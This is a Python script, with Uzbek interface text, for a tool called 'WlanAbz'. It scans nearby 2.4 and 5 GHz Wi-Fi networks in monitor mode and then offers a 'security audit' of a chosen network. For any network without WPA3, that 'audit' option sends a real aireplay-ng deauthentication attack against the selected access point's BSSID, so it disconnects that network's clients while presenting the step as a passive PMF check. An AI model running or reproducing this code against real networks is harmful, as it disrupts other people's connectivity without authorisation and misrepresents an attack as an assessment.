import os
import re
import shutil
import subprocess
import sys
import threading
import time


def check_root():
    """Skript root (sudo) huquqi bilan ishga tushirilganini tekshirish."""
    if os.geteuid() != 0:
        print("[-] Root (sudo) huquqi talab qilinadi.")
        print(f"    Sudo bilan ishga tushiring: sudo {sys.executable} {' '.join(sys.argv)}")
        sys.exit(1)


def auto_install_dependencies():
    """Kerakli paketlarni (scapy, rich, aircrack-ng) avtomatik o'rnatish."""
    apt_packages = []

    if shutil.which("airmon-ng") is None:
        apt_packages.append("aircrack-ng")

    try:
        import scapy
    except ImportError:
        apt_packages.append("python3-scapy")

    try:
        import rich
    except ImportError:
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "rich"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            apt_packages.append("python3-rich")

    if apt_packages:
        try:
            subprocess.run(
                ["apt", "update", "-y"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            subprocess.run(
                ["apt", "install", "-y"] + apt_packages,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass


check_root()
auto_install_dependencies()

from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff

console = Console()
networks = {}
stop_channel_hop = False

# 2.4GHz va 5GHz chastota kanallari ro'yxati
CHANNELS_2_4GHZ = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
CHANNELS_5GHZ = [
    36, 40, 44, 48, 52, 56, 60, 64, 
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 
    149, 153, 157, 161, 165
]
ALL_CHANNELS = CHANNELS_2_4GHZ + CHANNELS_5GHZ


def print_banner():
    """WlanAbz ASCII bannerini chiqarish."""
    os.system("clear" if os.name == "posix" else "cls")

    banner_art = r"""
 __        ___                _   _         
 \ \      / / | __ _ _ __    / \ | |__ ____ 
  \ \ /\ / /| |/ _` | '_ \  / _ \ | '_ \_  / 
   \ V  V / | | (_| | | | |/ ___ \| |_) / /  
    \_/\_/  |_|\__,_|_| |_/_/   \_\_.__/___| 
"""

    console.print(f"[cyan][bold]{banner_art}[/bold][/cyan]")
    console.print("[bold green]" + "=" * 57 + "[/bold green]")
    console.print(
        "[bold green]   Wi-Fi Dual-Band Scanner & Security Tool by WlanAbz  [/bold green]"
    )
    console.print("[bold green]" + "=" * 57 + "\n[/bold green]")


def channel_hopper(monitor_iface):
    """2.4GHz va 5GHz kanallari bo'ylab navbatma-navbat sakrash."""
    global stop_channel_hop
    idx = 0
    while not stop_channel_hop:
        try:
            channel = ALL_CHANNELS[idx % len(ALL_CHANNELS)]
            subprocess.run(
                ["iw", "dev", monitor_iface, "set", "channel", str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            idx += 1
            time.sleep(0.2)
        except Exception:
            break


def set_interface_channel(monitor_iface, target_channel):
    """Interfeysni aniq bir kanalga majburiy sozlash."""
    try:
        subprocess.run(
            ["iw", "dev", monitor_iface, "set", "channel", str(target_channel)],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True
    except Exception as e:
        console.print(f"[bold red][-] Kanalni sozlashda xatolik ({target_channel}): {e}[/bold red]")
        return False


def get_wifi_interfaces():
    """Mavjud Wi-Fi interfeyslarini aniqlash."""
    interfaces = []
    try:
        output = subprocess.check_output(
            ["ip", "-o", "link", "show"], text=True
        )
        for line in output.splitlines():
            match = re.search(r"^\d+:\s+([w][l][a-z0-9]+|[a-z0-9]+mon):", line)
            if match:
                iface = match.group(1)
                if iface not in interfaces:
                    interfaces.append(iface)
    except Exception:
        pass
    return interfaces


def enable_monitor_mode():
    """Wi-Fi kartani Monitoring rejimiga o'tkazish."""
    wifi_interfaces = get_wifi_interfaces()

    if not wifi_interfaces:
        console.print("[bold red][-] Wi-Fi interfeysi topilmadi.[/bold red]")
        return None

    if len(wifi_interfaces) == 1:
        target_iface = wifi_interfaces[0]
    else:
        console.print(
            "\n[bold cyan]--- Mavjud Wi-Fi Interfeyslari ---[/bold cyan]"
        )
        for idx, iface in enumerate(wifi_interfaces, 1):
            console.print(f" {idx}) {iface}")
        choice = input("\n[?] Interfeys raqamini kiriting: ").strip()
        try:
            target_iface = wifi_interfaces[int(choice) - 1]
        except (ValueError, IndexError):
            console.print("[bold red][-] Noto'g'ri tanlov.[/bold red]")
            return None

    subprocess.run(
        ["airmon-ng", "check", "kill"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        subprocess.run(
            ["airmon-ng", "start", target_iface],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        updated_interfaces = get_wifi_interfaces()
        monitor_iface = target_iface

        for iface in updated_interfaces:
            if iface.endswith("mon") or iface == target_iface:
                monitor_iface = iface
                break

        console.print(
            f"[bold green][+][/bold green] Monitoring rejimi yoqildi:"
            f" [cyan]'{monitor_iface}'[/cyan]\n"
        )
        return monitor_iface
    except subprocess.CalledProcessError:
        console.print(
            "[bold red][-] Monitoring rejimiga o'tkazishda xatolik.[/bold red]"
        )
        return None


def packet_handler(pkt):
    """Beacon paketlarini tutish va tahlil qilish."""
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        try:
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
        except Exception:
            ssid = ""

        if not ssid:
            ssid = "<Yashirin Tarmoq (Hidden)>"

        dbm_signal = pkt.dBm_AntSignal if hasattr(pkt, "dBm_AntSignal") else -100

        try:
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel", "Noma'lum")
            crypto = stats.get("crypto", "Noma'lum")
        except Exception:
            channel = "Noma'lum"
            crypto = "Noma'lum"

        freq_band = "5 GHz" if isinstance(channel, int) and channel > 14 else "2.4 GHz"

        networks[bssid] = {
            "ssid": ssid,
            "channel": channel,
            "signal": dbm_signal,
            "crypto": str(crypto),
            "band": freq_band
        }


def generate_live_table(time_left):
    """Real vaqtda yangilanadigan jadval interfeysi."""
    title_str = (
        f"[bold green]WlanAbz - DUAL-BAND SKANERLASH[/bold green] | Topildi:"
        f" [bold cyan]{len(networks)}[/bold cyan] ta | Qolgan vaqt: [bold"
        f" yellow]{time_left} soniya[/bold yellow]"
    )

    table = Table(
        title=title_str,
        show_header=True,
        header_style="bold magenta",
        expand=True,
    )
    table.add_column("№", style="dim", width=4, justify="center")
    table.add_column("SSID (Wi-Fi Nomi)", style="bold cyan", min_width=18)
    table.add_column("BSSID (MAC Manzil)", style="yellow", justify="center")
    table.add_column("Chastota", style="blue", justify="center")
    table.add_column("Kanal", style="green", justify="center")
    table.add_column("Signal (dBm)", justify="center")

    sorted_networks = sorted(
        networks.items(), key=lambda x: x[1]["signal"], reverse=True
    )

    for idx, (bssid, info) in enumerate(sorted_networks, 1):
        sig = info["signal"]
        if sig >= -60:
            sig_str = f"[bold green]{sig} dBm[/bold green]"
        elif sig >= -75:
            sig_str = f"[bold yellow]{sig} dBm[/bold yellow]"
        else:
            sig_str = f"[bold red]{sig} dBm[/bold red]"

        table.add_row(
            str(idx),
            info["ssid"][:25],
            bssid,
            info["band"],
            str(info["channel"]),
            sig_str,
        )

    return table


def scan_wifi_networks(monitor_iface):
    """Skanerlash vaqtini 35 soniya qilib, 2.4/5GHz kanallarni skanerlash."""
    global stop_channel_hop, networks
    networks.clear()
    stop_channel_hop = False

    total_scan_time = 35

    hop_thread = threading.Thread(
        target=channel_hopper, args=(monitor_iface,), daemon=True
    )
    hop_thread.start()

    def sniff_worker():
        try:
            sniff(
                iface=monitor_iface, prn=packet_handler, timeout=total_scan_time
            )
        except Exception:
            pass

    sniff_thread = threading.Thread(target=sniff_worker, daemon=True)
    sniff_thread.start()

    start_time = time.time()

    with Live(
        generate_live_table(total_scan_time),
        refresh_per_second=4,
        console=console,
    ) as live:
        while True:
            elapsed = time.time() - start_time
            time_left = max(0, int(total_scan_time - elapsed))

            live.update(generate_live_table(time_left))

            if time_left <= 0 or not sniff_thread.is_alive():
                break
            time.sleep(0.25)

    stop_channel_hop = True
    console.print(
        f"\n[bold green][+][/bold green] Skanerlash yakunlandi. Jami:"
        f" [bold cyan]{len(networks)}[/bold cyan] ta tarmoq topildi.\n"
    )


def show_selected_target_menu(target_bssid, target_info, monitor_iface):
    """Tanlangan tarmoqning xavfsizlik va xarakteristika tahlili."""
    print_banner()

    details = (
        f"[bold white]SSID (Tarmoq Nomi):[/bold white] [cyan]{target_info['ssid']}[/cyan]\n"
        f"[bold white]BSSID (MAC Manzil):[/bold white] [yellow]{target_bssid}[/yellow]\n"
        f"[bold white]Diapazon (Chastota):[/bold white] [blue]{target_info['band']}[/blue]\n"
        f"[bold white]Ishchi Kanal (CH):[/bold white] [green]{target_info['channel']}[/green]\n"
        f"[bold white]Signal Darajasi:[/bold white] [magenta]{target_info['signal']} dBm[/magenta]\n"
        f"[bold white]Himoya Turi:[/bold white] [blue]{target_info['crypto']}[/blue]"
    )

    panel = Panel(
        details,
        title="[bold cyan]TANLANGAN TARMOQ MA'LUMOTLARI[/bold cyan]",
        border_style="green",
    )
    console.print(panel)

    action_panel = Panel(
        "  [bold yellow]1[/bold yellow] -> Tarmoq xavfsizligini audit qilish (WPA3 / PMF Check)\n"
        "  [bold green]2[/bold green] -> Bosh menyuga qaytish\n"
        "  [bold red]0[/bold red] -> Dasturdan chiqish",
        title="[bold cyan]HARAKATNI TANLANG[/bold cyan]",
        border_style="cyan",
    )
    console.print(action_panel)

    choice = input("\n[?] Tanlovingizni kiriting (1/2/0): ").strip()

    if choice == "1":
        console.print(
            "\n[bold cyan][*] Tarmoq xavfsizligi va PMF (802.11w) tahlil qilinmoqda...[/bold cyan]"
        )
        time.sleep(1)

        # 1. Adaptor kanalini majburiy ravishda target router kanaliga moslashtirish
        target_channel = target_info["channel"]
        if isinstance(target_channel, int):
            console.print(f"[bold cyan][*] Wi-Fi kartasi {target_channel}-kanalga o'tkazilmoqda...[/bold cyan]")
            set_interface_channel(monitor_iface, target_channel)

        if "WPA3" in target_info["crypto"]:
            console.print(
                "[bold green][+] Tarmoq WPA3 va PMF bilan himoyalangan."
                " Boshqaruv kadrlari shifrlangan.[/bold green]"
            )
        else:
            # 2. Aireplay-ng uchun to'g'ri chaqiriq
            cmd = ["aireplay-ng", "--deauth", "10", "-a", target_bssid, monitor_iface]
            try:
                subprocess.run(cmd)
            except Exception as e:
                console.print(f"[bold red][-] Xatolik: {e}[/bold red]")

            console.print(
                "[bold yellow][!] Tarmoq WPA2 protokolidan foydalanmoqda."
                " Tavsiya: Router sozlamalarida PMF (802.11w) rejimini yoqing.[/bold yellow]"
            )
        input("\n[Davom etish uchun Enter bosing...]")
        show_selected_target_menu(target_bssid, target_info, monitor_iface)
    elif choice == "2":
        restore_network(monitor_iface)
        main()
    elif choice == "0":
        restore_network(monitor_iface)
        console.print(
            "\n[bold yellow][!] Dastur yakunlandi. Xayr![/bold yellow]"
        )
        sys.exit(0)
    else:
        console.print("\n[bold red][-] Noto'g'ri tanlov.[/bold red]")
        time.sleep(1)
        show_selected_target_menu(target_bssid, target_info, monitor_iface)


def restore_network(monitor_iface):
    """Monitoring rejimini to'xtatib, tarmoq xizmatlarini qayta tiklash."""
    if monitor_iface:
        subprocess.run(
            ["airmon-ng", "stop", monitor_iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        subprocess.run(
            ["systemctl", "restart", "NetworkManager"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        subprocess.run(
            ["service", "networking", "restart"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        console.print(
            "[bold green][+][/bold green] Internet va Wi-Fi holati qayta tiklandi."
        )


def main():
    print_banner()

    welcome_panel = Panel(
        "[bold white]Xush kelibsiz! WlanAbz vositasidan foydalanish uchun"
        " variantni tanlang:[/bold white]\n\n"
        "  [bold green]1[/bold green] -> Wi-Fi skanerlashni boshlash (2.4GHz + 5GHz)\n"
        "  [bold red]0[/bold red] -> Dasturdan chiqish",
        title="[bold cyan]BOSH MENYU[/bold cyan]",
        border_style="cyan",
    )
    console.print(welcome_panel)

    choice = input("\n[?] Tanlovingizni kiriting (1/0): ").strip()

    if choice == "1":
        print_banner()
        monitor_iface = enable_monitor_mode()

        if monitor_iface:
            scan_wifi_networks(monitor_iface)

            if not networks:
                restore_network(monitor_iface)
                return

            sorted_networks = sorted(
                networks.items(), key=lambda x: x[1]["signal"], reverse=True
            )

            try:
                target_idx = input(
                    "\n[?] Batafsil ko'rish uchun Wi-Fi tartib raqamini"
                    " kiriting: "
                ).strip()
                selected_item = sorted_networks[int(target_idx) - 1]
                target_bssid = selected_item[0]
                target_info = selected_item[1]

                show_selected_target_menu(
                    target_bssid, target_info, monitor_iface
                )
            except (ValueError, IndexError):
                console.print(
                    "\n[bold red][-] Noto'g'ri raqam kiritildi.[/bold red]"
                )
                restore_network(monitor_iface)
    elif choice == "0":
        console.print(
            "\n[bold yellow][!] Dastur yakunlandi. Xayr![/bold yellow]"
        )
        sys.exit(0)
    else:
        console.print("\n[bold red][-] Noto'g'ri tanlov kiritildi.[/bold red]")
        sys.exit(1)


if __name__ == "__main__":
    main()
